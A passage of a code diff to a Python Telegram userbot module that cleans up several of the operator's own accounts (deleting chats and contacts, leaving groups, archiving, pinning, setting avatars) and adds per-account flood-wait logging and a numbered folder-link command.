                     blocked.append(f"{get_full_name(ent)} (ID: {uid})")
                 except AccountFloodError:
                     raise
                 except Exception as e:
-                    s6_err.append(f"Block {uid}: {e}")
-                await asyncio.sleep(0.3)
+                    s8_err.append(f"Block {uid}: {e}")
+                await asyncio.sleep(0.5)
         except AccountFloodError:
             raise
         except Exception as e:
-            s6_err.append(f"Dialog iteration: {e}")
+            s8_err.append(f"Dialog iteration: {e}")
 
         summary.append(f"Private chats deleted: {len(deleted_pm)}")
         summary.append(f"Users blocked: {len(blocked)}")
@@ -1248,15 +1548,18 @@ class Manager(loader.Module):
         detailed.append(f"\n--- Blocked ({len(blocked)}) ---")
         for b in blocked:
             detailed.append(f"  {b}")
-        if s6_err:
-            detailed.append("\n--- Step 6 Errors ---")
-            for e in s6_err:
+        if s8_err:
+            detailed.append("\n--- Step 8 Errors ---")
+            for e in s8_err:
                 detailed.append(f"  {e}")
 
+        # Step 9: Leave chats not in folders
         left = []
-        s7_err = []
+        s9_err = []
         try:
-            _, all_filters = await self._get_existing_folder_ids(client)
+            _, all_filters = await self._get_existing_folder_ids(
+                client, account_name=account_name
+            )
             in_folders = await self._get_chats_in_folders(all_filters)
             await self._ensure_connected(client)
             dialogs = await client.get_dialogs()
@@ -1274,10 +1577,11 @@ class Manager(loader.Module):
                                 client,
                                 LeaveChannelRequest(channel=ent),
                                 context=f"LeaveChannel_{eid}",
+                                account_name=account_name,
                             )
                             left.append(f"{ent.title} (ID: {eid})")
                         except UserCreatorError:
-                            s7_err.append(f"Creator of {ent.title} ({eid})")
+                            s9_err.append(f"Creator of {ent.title} ({eid})")
                         except ChannelPrivateError:
                             left.append(f"{ent.title} (ID: {eid}, private/left)")
                     elif isinstance(ent, Chat):
@@ -1292,36 +1596,39 @@ class Manager(loader.Module):
                                     revoke_history=True,
                                 ),
                                 context=f"LeaveChat_{eid}",
+                                account_name=account_name,
                             )
                             left.append(f"{ent.title} (ID: {eid}, chat)")
                         except UserCreatorError:
-                            s7_err.append(f"Creator of {ent.title} ({eid})")
+                            s9_err.append(f"Creator of {ent.title} ({eid})")
                         except ChatIdInvalidError:
-                            s7_err.append(f"Invalid chat ID: {ent.title} ({eid})")
+                            s9_err.append(f"Invalid chat ID: {ent.title} ({eid})")
                 except AccountFloodError:
                     raise
                 except Exception as e:
-                    s7_err.append(f"Leave {eid}: {e}")
-                await asyncio.sleep(0.3)
+                    s9_err.append(f"Leave {eid}: {e}")
+                await asyncio.sleep(0.5)
         except AccountFloodError:
             raise
         except Exception as e:
-            s7_err.append(f"Leave iteration: {e}")
+            s9_err.append(f"Leave iteration: {e}")
 
         summary.append(f"Left chats/channels: {len(left)}")
         detailed.append(f"\n--- Left chats/channels ({len(left)}) ---")
         for item in left:
             detailed.append(f"  {item}")
-        if s7_err:
-            detailed.append("\n--- Step 7 Errors ---")
-            for e in s7_err:
+        if s9_err:
+            detailed.append("\n--- Step 9 Errors ---")
+            for e in s9_err:
                 detailed.append(f"  {e}")
 
+        # Step 10: Delete contacts
         del_contacts = []
-        s8_err = []
+        s10_err = []
         try:
             cr = await self._safe_request(
-                client, GetContactsRequest(hash=0), context="GetContacts"
+                client, GetContactsRequest(hash=0), context="GetContacts",
+                account_name=account_name,
             )
             if hasattr(cr, "users") and cr.users:
                 try:
@@ -1329,19 +1636,21 @@ class Manager(loader.Module):
                         client,
                         DeleteContactsRequest(id=cr.users),
                         context="DeleteContacts",
+                        account_name=account_name,
                     )
                     for cu in cr.users:
                         del_contacts.append(f"{get_full_name(cu)} (ID: {cu.id})")
                 except AccountFloodError:
                     raise
                 except Exception as e:
-                    s8_err.append(f"Batch delete contacts: {e}")
+                    s10_err.append(f"Batch delete contacts: {e}")
                     for cu in cr.users:
                         try:
                             await self._safe_request(
                                 client,
                                 DeleteContactsRequest(id=[cu]),
                                 context=f"DeleteContact_{cu.id}",
+                                account_name=account_name,
                             )
                             del_contacts.append(
                                 f"{get_full_name(cu)} (ID: {cu.id})"
@@ -1349,23 +1658,26 @@ class Manager(loader.Module):
                         except AccountFloodError:
                             raise
                         except Exception as e2:
-                            s8_err.append(f"Delete contact {cu.id}: {e2}")
+                            s10_err.append(f"Delete contact {cu.id}: {e2}")
                         await asyncio.sleep(0.2)
         except AccountFloodError:
             raise
         except Exception as e:
-            s8_err.append(f"Get contacts: {e}")
+            s10_err.append(f"Get contacts: {e}")
 
         summary.append(f"Contacts deleted: {len(del_contacts)}")
         detailed.append(f"\n--- Deleted contacts ({len(del_contacts)}) ---")
         for dc in del_contacts:
             detailed.append(f"  {dc}")
-        if s8_err:
-            detailed.append("\n--- Step 8 Errors ---")
-            for e in s8_err:
+        if s10_err:
+            detailed.append("\n--- Step 10 Errors ---")
+            for e in s10_err:
                 detailed.append(f"  {e}")
 
-        arch, arch_err = await self._archive_all_except(client, excluded_ids)
+        # Step 11: Archive all except excluded (with checks)
+        arch, arch_err = await self._archive_all_except(
+            client, excluded_ids, account_name=account_name
+        )
         summary.append(f"Chats archived: {len(arch)}")
         detailed.append(f"\n--- Archived chats ({len(arch)}) ---")
         for a in arch:
@@ -1375,8 +1687,9 @@ class Manager(loader.Module):
             for e in arch_err:
                 detailed.append(f"  {e}")
 
+        # Step 12: Pin & order chats
         pin_err = await self._pin_and_order_chats(
-            client, me.id, owner_id, spambot_id
+            client, me.id, owner_id, spambot_id, account_name=account_name
         )
         pin_ok = not pin_err
         summary.append(f"Pin & order: {'Done' if pin_ok else 'Partial/Error'}")
@@ -1388,9 +1701,10 @@ class Manager(loader.Module):
         else:
             detailed.append("  All pinned successfully")
 
+        # Step 13: Set avatar
         avatar_url = self.config["avatar_url"]
         if avatar_url:
-            av_ok, av_err = await self._set_avatar(client, avatar_url)
+            av_ok, av_err = await self._set_avatar(client, avatar_url, account_name=account_name)
             summary.append(f"Set avatar: {'Done' if av_ok else 'Error'}")
             detailed.append("\n--- Set avatar ---")
             if av_ok:
@@ -1400,6 +1714,18 @@ class Manager(loader.Module):
         else:
             summary.append("Set avatar: Skipped (no URL)")
             detailed.append("\n--- Set avatar: Skipped ---")
+
+        # Step 14: Ensure all archived chats are muted
+        muted_fix, mute_fix_err = await self._ensure_archive_muted(
+            client, excluded_ids, account_name=account_name
+        )
+        summary.append(f"Archive mute check: {muted_fix} fixed")
+        detailed.append(f"\n--- Archive mute check ---")
+        detailed.append(f"  Fixed unmuted archived chats: {muted_fix}")
+        if mute_fix_err:
+            detailed.append("\n--- Archive mute check Errors ---")
+            for e in mute_fix_err:
+                detailed.append(f"  {e}")
 
         return summary, detailed
 
@@ -1567,13 +1893,28 @@ class Manager(loader.Module):
 
     async def _cmd_folder(self, message: Message, args):
         if len(args) < 2:
-            if self.config["folder_link"]:
-                self.config["folder_link"] = ""
-                return await utils.answer(message, self.strings["folder_cleared"])
             return await utils.answer(message, self.strings["folder_provide"])
-        self.config["folder_link"] = args[1]
+
+        try:
+            folder_num = int(args[1])
+            if folder_num not in (1, 2, 3):
+                return await utils.answer(message, self.strings["folder_invalid_num"])
+        except ValueError:
+            return await utils.answer(message, self.strings["folder_invalid_num"])
+
+        key = f"folder_link_{folder_num}"
+
+        if len(args) < 3:
+            if self.config[key]:
+                self.config[key] = ""
+                return await utils.answer(
+                    message, self.strings["folder_cleared"].format(num=folder_num)
+                )
+            return await utils.answer(message, self.strings["folder_provide"])
+
+        self.config[key] = args[2]
         await utils.answer(
-            message, self.strings["folder_set"].format(link=args[1])
+            message, self.strings["folder_set"].format(num=folder_num, link=args[2])
         )
 
     async def _cmd_ava(self, message: Message, args):
@@ -1622,6 +1963,7 @@ class Manager(loader.Module):
             status = await utils.answer(message, self.strings["processing"])
             self._status_msg = status[0] if isinstance(status, list) else status
             self._flood_until.clear()
+            self._flood_log.clear()
 
             all_results = {}
             pending = {}
@@ -1653,19 +1995,22 @@ class Manager(loader.Module):
 
                     all_flooded_now = False
                     ran_any = True
+                    account_name = info["sdata"]["name"]
 
                     try:
                         await self._ensure_connected(client)
                         me = await client.get_me()
                         name = get_full_name(me)
-                        s, d = await self._process_account(client, me)
+                        s, d = await self._process_account(
+                            client, me, account_name=name
+                        )
                         info["summary"] = [f"\n=== [{i + 1}] {name} (ID: {me.id}) ==="] + s
                         info["detailed"] = [f"\n{'=' * 50}"] + d
                         info["done"] = True
-                    except AccountFloodError:
+                    except AccountFloodError as fe:
                         logger.info(
-                            f"[MANAGER] Account [{i + 1}] {info['sdata']['name']} "
-                            f"got flood, switching to next"
+                            f"[MANAGER] Account [{i + 1}] {account_name} "
+                            f"got flood in {fe.method}, switching to next"
                         )
                         await self._update_flood_status()
                     except Exception as e:
@@ -1751,6 +2096,22 @@ class Manager(loader.Module):
                 + "\n".join(all_detailed)
             )
 
+            flood_log_text = f"MANAGER - FLOOD LOG\nDate: {ts}\n{sep}\n"
+            if self._flood_log:
+                for entry in self._flood_log:
+                    flood_log_text += (
+                        f"\nAccount: {entry['account']}\n"
+                        f"Method: {entry['method']}\n"
+                        f"Flood seconds: {entry['flood_seconds']}\n"
+                        f"Extra wait: {entry['extra_wait']}\n"
+                        f"Total wait: {entry['total_wait']}\n"
+                        f"Timestamp: {entry['timestamp']}\n"
+                        f"Resume at: {entry['resume_at']}\n"
+                        f"{'-' * 30}\n"
+                    )
+            else:
+                flood_log_text += "\nNo flood events recorded.\n"
+
             topic_id = None
             reply_to = getattr(message, "reply_to", None)
             if reply_to:
@@ -1780,6 +2141,16 @@ class Manager(loader.Module):
                 message.chat_id,
                 df,
                 caption="<b>Detailed Log</b>",
+                reply_to=topic_id,
+                parse_mode="html",
+            )
+
+            ff = io.BytesIO(flood_log_text.encode("utf-8"))
+            ff.name = "flood_log.txt"
+            await self._client.send_file(
+                message.chat_id,
+                ff,
+                caption="<b>Flood Log</b>",
                 reply_to=topic_id,
                 parse_mode="html",
             )
